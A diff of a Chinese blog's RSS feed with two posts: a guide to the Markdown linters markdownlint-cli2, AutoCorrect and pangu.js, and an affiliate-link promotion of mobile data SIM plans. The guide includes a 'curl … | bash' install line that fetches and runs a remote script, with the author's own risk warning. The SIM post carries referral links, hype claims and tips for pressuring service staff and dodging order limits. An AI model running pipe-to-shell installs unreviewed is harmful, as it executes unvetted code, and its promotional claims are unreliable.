+&lt;pre&gt;&lt;code&gt;markdownlint-cli2 [文件路径]     // 检查文件并报告问题
+markdownlint-cli2-fix [文件路径] // 检查并直接修复文件
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://cdnfile.sspai.com/2022/03/25/bcc698ced77c769610a5fde452137911.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1/format/webp&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;其中，文件路径可以是一个或多个实际的文件名，也可以是通配符。例如：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;markdownlint-cli2 &amp;quot;**/*.md&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;是指检查当前目录以及任意层级子目录中，所有以  &lt;code&gt;md&lt;/code&gt;  为后缀名的文件。&lt;/p&gt;
+&lt;h4 id=&#34;自定义配置-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#自定义配置-2&#34;&gt;#&lt;/a&gt; 自定义配置&lt;/h4&gt;
+&lt;p&gt;&lt;code&gt;markdownlint-cli2&lt;/code&gt;  与 VSCode 插件使用完全相同的配置语法。因此，在根据自己习惯配置好 VSCode 插件后，只要将其中 config 对象的内容复制出来，保存为一个名为  &lt;code&gt;.markdownlint.json&lt;/code&gt;  的文件（也可以用一些其他的文件名和格式，详见 &lt;a href=&#34;https://sspai.com/link?target=https%3A%2F%2Fgithub.com%2FDavidAnson%2Fmarkdownlint-cli2%23configuration&#34;&gt;文档&lt;/a&gt;），与待检查的 Markdown 文件放在同一文件夹（如果要检查多个文件，则放在其共同的最上级文件夹）， &lt;code&gt;markdownlint-cli2&lt;/code&gt;  就会自动读取并执行。&lt;/p&gt;
+&lt;p&gt;在下图例子中，由于通过配置文件改变了部分规则，下方的终端的输出也少了相应条目：&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://cdnfile.sspai.com/2022/03/25/817088686409d30b5829833bc3b2303b.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1/format/webp&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;值得一提的是，如果某个文件夹中存放了上述配置文件，而其配置内容与 VSCode 插件的设置不同，那么在编辑这个文件夹内的 Markdown 文件时，VSCode 也会优先使用这个外部配置文件的设置。这特别适合为不同项目微调配置。&lt;/p&gt;
+&lt;p&gt;最后，如果你有固定的设置想要搭配  &lt;code&gt;markdownlint-cli2&lt;/code&gt;  使用，又不想每次都创建一个配置文件，也可以用：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;markdownlint-cli2-config [配置文件路径] [Markdown 文件路径]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;的语法来手动指定配置文件路径。&lt;/p&gt;
+&lt;h2 id=&#34;保持中英文之间的盘古之白&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#保持中英文之间的盘古之白&#34;&gt;#&lt;/a&gt; 保持中英文之间的「盘古之白」&lt;/h2&gt;
+&lt;p&gt;在很多中文社区，中英文之间要手动加空格 —— 俗称「盘古之白」—— 都是不成文的风格要求。这项要求是否合理、又该如何满足，是很有价值的话题，但超出了本文的讨论范围。&lt;/p&gt;
+&lt;p&gt;这里，只简单概括通说：中英文之间加入空隙，是为了实现视觉上的区隔，更加美观和易读。理想情况下，这种「空隙」应当由排版引擎自动加入，宽度宜为 1/4 个全角空格（em）。但由于数字排版环境复杂多变，在大多数时候（包括最常见的网页环境）不能指望排版引擎有这种能力，因此只能退而求其次，手动插入一个半角空格（因其宽度&lt;strong&gt;通常&lt;/strong&gt;接近于 1/4 em），达到类似效果。&lt;/p&gt;
+&lt;p&gt;（** 注：** 如果有进一步兴趣，请阅读知乎讨论「&lt;a href=&#34;https://sspai.com/link?target=https%3A%2F%2Fwww.zhihu.com%2Fquestion%2F19587406&#34;&gt;中英文混排时中文与英文之间是否要有空格？&lt;/a&gt;」，W3C 标准草案《中文排版需求》&lt;a href=&#34;https://sspai.com/link?target=https%3A%2F%2Fwww.w3.org%2FTR%2Fclreq%2F%23mixed_text_composition_in_horizontal_writing_mode&#34;&gt;§3.2.2&lt;/a&gt;，以及收听《字谈字畅》播客 &lt;a href=&#34;https://sspai.com/link?target=https%3A%2F%2Fwww.thetype.com%2Ftypechat%2Fep-014%2F&#34;&gt;第 14 期&lt;/a&gt;。）&lt;/p&gt;
+&lt;p&gt;相比之下，本文关心的问题是：如果想要在中英文之间手动加空格，有什么自动检查和补全的方法吗？&lt;/p&gt;
+&lt;p&gt;答案是当然有，而且选择也不止一个。其中，最著名的可能是 &lt;a href=&#34;https://sspai.com/link?target=https%3A%2F%2Fgithub.com%2Fvinta%2Fpangu.js%2F&#34;&gt;pangu.js&lt;/a&gt; 项目。如果你用过一个叫做「&lt;a href=&#34;https://sspai.com/link?target=https%3A%2F%2Fchrome.google.com%2Fwebstore%2Fdetail%2F%25E7%2582%25BA%25E4%25BB%2580%25E9%25BA%25BC%25E4%25BD%25A0%25E5%2580%2591%25E5%25B0%25B1%25E6%2598%25AF%25E4%25B8%258D%25E8%2583%25BD%25E5%258A%25A0%25E5%2580%258B%25E7%25A9%25BA%25E6%25A0%25BC%25E5%2591%25A2%25EF%25BC%259F%2Fpaphcfdffjnbcgkokihcdjliihicmbpd%3Fhl%3Dzh-CN&#34;&gt;为什么你们就是不能加个空格呢？&lt;/a&gt;」的浏览器插件，那你也就用过 pangu.js—— 它正是出自同一位作者之手、以 pangu.js 为底层支撑的。&lt;/p&gt;
+&lt;p&gt;另一个选择是 &lt;a href=&#34;https://sspai.com/link?target=https%3A%2F%2Fgithub.com%2Fhuacnlee%2Fautocorrect&#34;&gt;AutoCorrect&lt;/a&gt;。与主要关注文本内容的 pangu.js 相比，AutoCorrect 出生于 Ruby 语言的中文社区，因此从一开始就考虑到了编程代码中的中英混排场景（可以参见该项目的 &lt;a href=&#34;https://sspai.com/link?target=https%3A%2F%2Fgithub.com%2Fhuacnlee%2Fautocorrect%2Ftree%2Fmain%2Ftests%2Ffixtures&#34;&gt;测试文件&lt;/a&gt;），通用性更强。&lt;/p&gt;
+&lt;p&gt;不过，两者在实际使用的区别很小，唯一比较明显的差别是 pangu.js 会&lt;strong&gt;在链接文本的前后加上空格&lt;/strong&gt;，而 AutoCorrect 不会；这也只是见仁见智的选择。此外，pangu.js 没有官方的 VSCode 插件，只有几个第三方插件，但已久不更新，命令行工具也依赖于 Node.js，一般用户初次运行起来可能有点繁琐；而 AutoCorrect 则提供了官方 VSCode 插件，命令行版本没有外部依赖，选项也更多。&lt;/p&gt;
+&lt;p&gt;因此，下文将同时介绍这两个工具，读者按偏好选择其一即可。&lt;/p&gt;
+&lt;h3 id=&#34;网页版-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#网页版-2&#34;&gt;#&lt;/a&gt; 网页版&lt;/h3&gt;
+&lt;p&gt;与 markdownlint 类似，AutoCorrect 也提供了一个 &lt;a href=&#34;https://sspai.com/link?target=https%3A%2F%2Fhuacnlee.com%2Fautocorrect%2F&#34;&gt;在线预览版&lt;/a&gt;，既可用来测试该工具的效果，也可用来处理实际文件。&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://cdnfile.sspai.com/2022/03/25/a20cf3bfac09f39620180ebb4e0fa82a.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1/format/webp&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;打开该工具后，在左上角的下拉菜单中选择「Markdown」，粘入自己的内容，然后点击下方的「Format」按钮即可看到输出。&lt;/p&gt;
+&lt;p&gt;pangu.js 没有官方网页版。&lt;/p&gt;
+&lt;h3 id=&#34;在-vscode-中使用-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#在-vscode-中使用-2&#34;&gt;#&lt;/a&gt; 在 VSCode 中使用&lt;/h3&gt;
+&lt;p&gt;AutoCorrent 提供了第一方的 &lt;a href=&#34;https://sspai.com/link?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dhuacnlee.auto-correct&#34;&gt;VSCode 插件&lt;/a&gt;。安装后，建议在「设置」&amp;gt;「扩展」&amp;gt;「AutoCorrect」中按需调整该插件的两个选项：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Enable：是否允许实时检查。如果启用，文件里中英文未留空的位置将会被当作「问题」予以提示，并且可以通过 Quick Fix 功能一键添加空格。&lt;/li&gt;
+&lt;li&gt;Format On Save：是否在保存时自动修复中英文之间的空格。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;这两个选项都是默认启用的，但我&lt;strong&gt;建议考虑关闭&lt;/strong&gt;。理由也与上面配置 markdownlint 时类似：文档是否「整洁」并没有必要在写作阶段就特意关注，而是修订校对阶段的任务。特别是对于中英文空格这种「小节」，启用实时修复只会让界面充斥着提示问题的波浪线，非常干扰写作。&lt;/p&gt;
+&lt;p&gt;无论是否启用这些选项，都可以通过命令面板中的「AutoCorrect: Format document」命令来手动为文件添加中英文空格。如果想要更方便，还可以点击该命令右侧的齿轮图标，为其指定一个快捷键，随时满足自己的强迫症。&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://cdnfile.sspai.com/2022/03/25/1f9025bab440e9dcd8d61c9100a66f23.gif&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;pangu.js 没有官方 VSCode 插件，但有几个第三方移植版，其中用户较多、效果也不错的是 xlthu 开发的 &lt;a href=&#34;https://sspai.com/link?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dxlthu.Pangu-Markdown&#34;&gt;Pangu-Markdown&lt;/a&gt;。安装后，在命令面板选择「Pangu Format」即可检查全文并追加空格。&lt;/p&gt;
+&lt;h3 id=&#34;在命令行中使用-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#在命令行中使用-2&#34;&gt;#&lt;/a&gt; 在命令行中使用&lt;/h3&gt;
+&lt;p&gt;AutoCorrect 提供了为各个平台编译的命令行工具，官方文档提供的安装脚本如下：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;curl -sSL https://git.io/JcGER | bash
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;（** 注：** 有义务提醒， &lt;code&gt;curl | sh&lt;/code&gt;  风格的安装方式是有 &lt;a href=&#34;https://sspai.com/link?target=https%3A%2F%2F0x46.net%2Fthoughts%2F2019%2F04%2F27%2Fpiping-curl-to-shell%2F&#34;&gt;内在风险&lt;/a&gt; 的，请务必逐行审阅  &lt;code&gt;curl&lt;/code&gt;  下载的 &lt;a href=&#34;https://sspai.com/link?target=https%3A%2F%2Fgithub.com%2Fhuacnlee%2Fautocorrect%2Fblob%2Fmain%2Finstall&#34;&gt;安装脚本内容&lt;/a&gt; 再决定要不要运行。）&lt;/p&gt;
+&lt;p&gt;与 markdownlint 类似，AutoCorrect 也可以选择是只报告问题，还是直接修复文件：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;autocorrect [文件路径]       // 检查文件并报告问题
+autocorrect --fix [文件路径] // 检查并直接修复文件
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://cdnfile.sspai.com/2022/03/25/2bca344136fee54763f60f1ca0a1e854.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1/format/webp&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;更完整的使用方法可以使用  &lt;code&gt;autocorrect --help&lt;/code&gt;  查看，或者 &lt;a href=&#34;https://sspai.com/link?target=https%3A%2F%2Fgithub.com%2Fhuacnlee%2Fautocorrect%23using-cli&#34;&gt;阅读在线文档&lt;/a&gt;。&lt;/p&gt;
+&lt;p&gt;至于 pangu.js，其命令行工具则需通过  &lt;code&gt;npm&lt;/code&gt;  安装：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;npm i -g pangu
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;相比 AutoCorrect，其功能也比较简单，只能将补齐空格后的内容直接显示出来，必须配合  &lt;code&gt;&amp;gt;&lt;/code&gt;  重定向才能写入到文件：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;pangu -t [文本内容]             // 检查指定文本内容
+panfu -f [文件路径]             // 检查指定文件
+pangu -f [文件路径] &amp;gt; [写入路径] // 检查指定文件并将结果写入到文件
+&lt;/code&gt;&lt;/pre&gt;
+ ]]></description>
+        </item>
         <item>
             <guid isPermalink="true">http://example.com/2024/08/12/HaoKa/Hao%20Ka%20Recommend/</guid>
             <title>流量卡 Recommend</title>
@@ -20,12 +519,139 @@
             <category term="HaoKa" scheme="http://example.com/categories/HaoKa/" />
             <category term="Hao Ka Recommend" scheme="http://example.com/tags/Hao-Ka-Recommend/" />
             <pubDate>Mon, 12 Aug 2024 14:05:14 +0800</pubDate>
-            <description><![CDATA[ &lt;h1 id=&#34;hao-ka-recommend&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#hao-ka-recommend&#34;&gt;#&lt;/a&gt; Hao Ka Recommend&lt;/h1&gt;
-&lt;h2 id=&#34;haodjwo&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#haodjwo&#34;&gt;#&lt;/a&gt; Haodjwo&lt;/h2&gt;
-&lt;h2 id=&#34;难道不尅一使用数字作为标题&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#难道不尅一使用数字作为标题&#34;&gt;#&lt;/a&gt; 难道不尅一使用数字作为标题&lt;/h2&gt;
+            <description><![CDATA[ &lt;h1 id=&#34;好用又划算的流量卡-2024&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#好用又划算的流量卡-2024&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;rainbow&#34;&gt;好用又划算的流量卡 2024&lt;/span&gt;&lt;/h1&gt;
 &lt;blockquote&gt;
-&lt;p&gt;破案了，标题前要加两个空格，并且不能使用数字开头作为标题&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;本篇文章主推三张卡：&lt;/code&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;a href=&#34;https://172.lot-ml.com/h5orderEn/index?pudID=78a072a74e11bbd5&amp;amp;userid=ea35dca6f9135e7d&#34;&gt;电信海神卡&lt;/a&gt; - 29 元 / 月 155G 通用流量＋ 30G 定向流量 + 通话 0.1 + 首月送 30 元话费（可自主选号）&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://172.lot-ml.com/h5orderEn/index?pudID=78a072a74e11bbd5&amp;amp;userid=ea35dca6f9135e7d&#34;&gt;电信海锦卡&lt;/a&gt; - 29 元 / 月 170G 通用流量＋ 30G 定向流量 + 通话 0.1 + 首月送 30 元话费（博主本人正在使用）&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://172.lot-ml.com/h5orderEn/index?pudID=78a072a74e11bbd5&amp;amp;userid=ea35dca6f9135e7d&#34;&gt;联通海锅卡&lt;/a&gt; - 29 元 / 月 183G 通用流量 + 100 分钟通话&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;每张卡达到指标后都可能下架，错过了就很难办到了，比如我上个月主推的电信海星卡，已经下架了。&lt;/p&gt;
+&lt;p&gt;所有号卡都是免费领取，快递包邮。&lt;/p&gt;
 &lt;/blockquote&gt;
+&lt;p&gt;不要忽视任何可能的陷阱，不要给任何套路商家一个套路的机会，希望从各个角度解决大家流量不足的问题。&lt;/p&gt;
+&lt;p&gt;在这里，你会发现以前觉得还可以的不限量套餐、某迅某王卡、某花卡都是弟中弟！坑中坑！因为在这里会让你看到太多的高性价比套餐。&lt;/p&gt;
+&lt;p&gt;先来几个避坑小技巧（套路商家看完都要掉眼泪！百分之 90 的人都不知道的关键技巧）。&lt;/p&gt;
+&lt;h2 id=&#34;避坑技巧&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#避坑技巧&#34;&gt;#&lt;/a&gt;  &lt;code&gt;避坑技巧：&lt;/code&gt;&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;如何节省不必要的话费开支&lt;/strong&gt;？&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;我的建议就是先找到合适的高性价比手机流量卡套餐专作流量使用，确认好用，再将老手机卡转为最低八元套餐作通话和绑 app 用。双卡双待，完美运行。&lt;/p&gt;
+&lt;div class=&#34;note info&#34;&gt;
+&lt;p&gt;我自己之前的月租在 69，流量是 30G 通用，无定向流量，有的时候超了流量会到 100 多话费，因为找到这个好套餐后，果断给主卡改了最低消费，现在的资费情况是 8 月租最低套餐 + 副卡 29 月租的 200G 流量套餐，170G 通用流量 + 30G 定向流量，37 元完美解决所有问题。&lt;/p&gt;
+&lt;/div&gt;
+&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;&lt;strong&gt;避坑物联卡！！&lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;note danger&#34;&gt;
+&lt;p&gt;很多朋友都上过物联卡的当吧，包括我也是，当时还以为是啥好东西后来被坑了，才慢慢了解到物联卡就是个巨坑！首先有虚量、而且没有售后服务，最后直接停我卡，商家也跑路了。&lt;/p&gt;
+&lt;/div&gt;
+&lt;p&gt;所以大家还是选择三大运营商的正规手机卡好，不会出现这些乱七八糟的问题。&lt;/p&gt;
+&lt;ol start=&#34;3&#34;&gt;
+&lt;li&gt;&lt;strong&gt;一定要看清楚套餐的优惠期是多久&lt;/strong&gt;！&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;note danger&#34;&gt;
+&lt;p&gt;优惠期有长期也有短期的，像有的朋友申请了一张手机卡，刚开始用着还不错，过了一阵子突然月租变贵了流量也少了，这种情况就是优惠期是短期的，优惠期结束优惠也就没有了，所以大家一定要看清楚。&lt;strong&gt;这里我也只推长期卡，9 元 / 19 元的卡不会推荐，因为这种优惠期基本都是短期的。&lt;/strong&gt;&lt;/p&gt;
+&lt;/div&gt;
+&lt;p&gt;一般基础套餐都是长期的，一直不会变，但是叠加套餐有的是有期限的，千万要注意在优惠期结束的时候注销，不然过了优惠期流量少的不行，月租还贵；当然也有少部分是长期的，这样的套餐就可遇不可求。&lt;/p&gt;
+&lt;p&gt;不多说了，下面我们进入主题。&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h2 id=&#34;流量卡推荐&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#流量卡推荐&#34;&gt;#&lt;/a&gt;  &lt;code&gt;流量卡推荐：&lt;/code&gt;&lt;/h2&gt;
+&lt;p&gt;① &lt;span class=&#34;rainbow&#34;&gt;&lt;strong&gt;电信沧节卡 - 长期有效套餐 | 每月 29 元包 155G 通用流量＋ 30G 定向流量 + 通话 0.1 + 首月送 30 元话费&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;我把沧节卡放在第一个的主要原因是它的优惠期长达 20 年，而且有着极高的审核通过率，对于追求全面性价比的朋友们来说，选择这个是最好的选择。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;电信沧节套餐专属申请地址:&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://172.lot-ml.com/h5orderEn/index?pudID=78a072a74e11bbd5&amp;amp;userid=ea35dca6f9135e7d&#34;&gt;https://172.lot-ml.com/h5orderEn/index?pudID=78a072a74e11bbd5&amp;amp;userid=ea35dca6f9135e7d&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;套餐详情:&lt;/strong&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;激活强充 100 元话费享以下优惠&lt;/p&gt;
+&lt;p&gt;1. 激活首月赠送 30 元话费，可抵扣首月月租。&lt;/p&gt;
+&lt;p&gt;2. 激活充值 100 元立即到账。&lt;/p&gt;
+&lt;p&gt;3. 激活首充 72 小内自动添加 155G 通用流量 (24 个月) 到期双方无异议自动续约 2 年，以此类推长期 20 年。&lt;/p&gt;
+&lt;p&gt;4. 默认订购 5G 网络权益升级包，享受 5G 黄金会员速率，开通本业务不需要收取额外费用 (有效期 2 年)，到期双方无异议自动续约 2 年，以此类推长期。支持 5G 黄金速率 500Mbp/s。&lt;/p&gt;
+&lt;p&gt;定向流量包含 (百度系、网易系、头条系) 快手、腾讯视频、优酷视频，更多定向软件以运营商发布为准。&lt;/p&gt;
+&lt;p&gt;5. 综上所述：首月免费，之后每月 29 元月租 155G 通用流量 + 30G 定向流量&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;激活方式:&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;自主激活，线上激活链接 &lt;a href=&#34;https://hb.189.cn/pages/webrtcwap/vmalndex.action&#34;&gt;https://hb.189.cn/pages/webrtcwap/vmalndex.action&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;运营商禁发地区&lt;/strong&gt;：北京市，广西壮族自治区，贵州省，云南省，西藏自治区，新疆维吾尔自治区。&lt;strong&gt;禁发地区不要申请这个套餐，不然不会发出&lt;/strong&gt;。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;申请限制年龄&lt;/strong&gt;：18~65 岁，其他年龄会审核失败。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;快递方式:&lt;/strong&gt; 京东或顺丰快递（到货后 7 天内激活，逾期未激活号码自动回收，激活后请立即插入手机并立即拨打一次电话否则无法正常使用需二次实名认证。）&lt;/p&gt;
+&lt;hr /&gt;
+&lt;p&gt;② &lt;span class=&#34;rainbow&#34;&gt;&lt;strong&gt;电信海锦卡【29 元 200G+20 年长期套餐】(本人正在使用)&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;专属申请地址:&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://172.lot-ml.com/h5orderEn/index?pudID=78a072a74e11bbd5&amp;amp;userid=ea35dca6f9135e7d&#34;&gt;https://172.lot-ml.com/h5orderEn/index?pudID=78a072a74e11bbd5&amp;amp;userid=ea35dca6f9135e7d&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;套餐详情:&lt;/strong&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;原套餐: 29 元包含 30G 流量；(前三个月关闭长途语音功能) 三个月后可开通全国通话，套餐外：流量 5 元 / G，通话 0.1 元 / 分，彩信短信 0.1 元 / 分&lt;/p&gt;
+&lt;p&gt;激活当月任意渠道充值 100 元可享受以下优惠 享受以下优惠&lt;/p&gt;
+&lt;p&gt;1、激活首月送 30 元话费，当月有效，套餐按天折算。&lt;/p&gt;
+&lt;p&gt;2、激活 24 小时到账 170G 通用流量 (优惠 20 年)&lt;/p&gt;
+&lt;p&gt;优惠后首月免月租，每月月租为 29 元包含&lt;/p&gt;
+&lt;p&gt;170G 通用流量 + 30G 定向流量；(有效期 20 年)&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;激活方式:&lt;/strong&gt; 面对面激活&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;运营商禁发地区&lt;/strong&gt;：新疆 西藏 云南 吉林。&lt;strong&gt;禁发地区不要申请这个套餐，不然不会发出&lt;/strong&gt;。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;申请限制年龄&lt;/strong&gt;：22-55 岁&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;快递方式：京东&lt;/strong&gt;&lt;/p&gt;
+&lt;hr /&gt;
+&lt;p&gt;③ &lt;span class=&#34;rainbow&#34;&gt;&lt;strong&gt;联通海锅卡【长期】29 元 183G+100 分钟&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;专属申请地址:&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://172.lot-ml.com/h5orderEn/index?pudID=78a072a74e11bbd5&amp;amp;userid=ea35dca6f9135e7d&#34;&gt;https://172.lot-ml.com/h5orderEn/index?pudID=78a072a74e11bbd5&amp;amp;userid=ea35dca6f9135e7d&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;套餐详情:&lt;/strong&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;原套餐 29 元包 3G 全国通用流量 + 100 分钟全国通话&lt;/p&gt;
+&lt;p&gt;激活当月务必首充 100 元，状态正常 24 小时内添加 180G 全国通用流量包 (有效期 24 个月)，到期自动续约。&lt;/p&gt;
+&lt;p&gt;注：不按要求首充不享宣传优惠，流量包到账需要时间，月底收到卡的用户激活后按天扣费，流量和通话按天给。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;综上所述&lt;/strong&gt;：首月按天，次月起 29 月租 183G 通用流量 + 100 分钟免费通话，到期自动续约。&lt;/p&gt;
+&lt;p&gt;到货后激活有效期 7 天，逾期未激活号码自动回收。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;激活方式:&lt;/strong&gt; 自主激活，需上传三证&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;运营商禁发地区&lt;/strong&gt;：新疆，西藏，云南，北京，辽宁，广东，河北 五莲县，临高县，秀英区，嘉兴市&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;申请限制年龄&lt;/strong&gt;：18-60 周岁&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;快递方式:&lt;/strong&gt; EMS 邮政发货&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h2 id=&#34;申请-tips&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#申请-tips&#34;&gt;#&lt;/a&gt;  &lt;code&gt;申请 Tips：&lt;/code&gt;&lt;/h2&gt;
+&lt;div class=&#34;note info&#34;&gt;
+&lt;p&gt;注意：所有套餐运营商都是确定好数量再发向市场，一般性价比越高的套餐下架就越快，可能上一秒还在的套餐下一秒就下架了，所以套餐如果显示申请不了了就是下架了，大家注意了。需要的朋友抓紧，后期可能就无好卡可办，还能申请的套餐我放到前面，方便大家看（已经申请了的不会受到下架影响）。&lt;/p&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;strong&gt;下面我再给大家讲一些有些朋友在办正规卡的时候和用的时候遇到的问题的解答&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;如何查询申请后的订单即物流？部分朋友为什么会办理失败？&lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;在专属链接实名领取后，会有短信通知在哪里查询订单，我买的是京东快递，第二天就到了。&lt;/p&gt;
+&lt;p&gt;一证 5 号已满无法办理。30 天内在网上办理过套餐的（30 天内一个人的个人信息只能办理一次，并且不同人办的话地址也不能重复，可在后面加房号或姓名避免重复）&lt;/p&gt;
+&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;&lt;strong&gt;很多套餐都会首月免费，什么是按天折算？&lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;只要首月免费就会涉及到一个东西就是按天折算，按天折算就是运营商会根据你本月激活的时间来按比例给你流量、通话和月租，本月激活的越晚给的流量就会越少。&lt;/p&gt;
+&lt;p&gt;第二个月就是全部到账了。&lt;/p&gt;
+&lt;ol start=&#34;3&#34;&gt;
+&lt;li&gt;&lt;strong&gt;为什么流量和话费没有到账？&lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;部分时间段激活人比较多，24 小时内到账哈，经评论区朋友反应有极少部分 48 小时内到账，大家不用担心。&lt;/p&gt;
+&lt;ol start=&#34;4&#34;&gt;
+&lt;li&gt;&lt;strong&gt;通用流量和定向流量具体是怎么在用？&lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;答：当手机里面通用流量和定向流量都有时，在定向 APP 内先用定向流量，定向流量用完再用通用流量。&lt;/p&gt;
+&lt;ol start=&#34;5&#34;&gt;
+&lt;li&gt;&lt;strong&gt;线上办理的手机卡可以更改归属地吗？&lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;答：不可以，线上办理的手机卡就是当地营业厅有任务才优惠给大家办理的，如果改归属地了，那当地怎么完成分配任务呢。&lt;/p&gt;
+&lt;ol start=&#34;6&#34;&gt;
+&lt;li&gt;&lt;strong&gt;转最低套餐方法！&lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;俗话说：鱼和熊掌不可兼得，今天就教大家一个兼得的方法，先办一个高性价比的手机卡套餐，专门用流量，再将自己的主卡改为最低保号套餐，用于打电话和绑定用。&lt;/p&gt;
+&lt;p&gt;电信保号套餐是 5 元的，移动联通都是 8 元保号套餐。&lt;/p&gt;
+&lt;p&gt;不用专门跑去营业厅整，他们的权限还没有运营商的客服权限高，三大运营商客服电话（电信 10000，移动 10086，联通 10010），找客服一般都能成功，如果客服不给改的话，就得上话术了：我朋友都改了，怎么我不能改？你的工号是多少，我要工信部投诉你，到时候还不是得你处理，基本上这样都给改了，如果不行那就真投诉，保证运营商主动打电话给你改套餐。&lt;/p&gt;
+&lt;ol start=&#34;7&#34;&gt;
+&lt;li&gt;&lt;strong&gt;线上申请上架套餐，实名认证有什么要求？&lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;有的套餐在申请时需要上传信息，有的套餐是申请后卡到手了再上传实名信息，所有线上申请的手机卡套餐都是需要进行实名认证的。&lt;/p&gt;
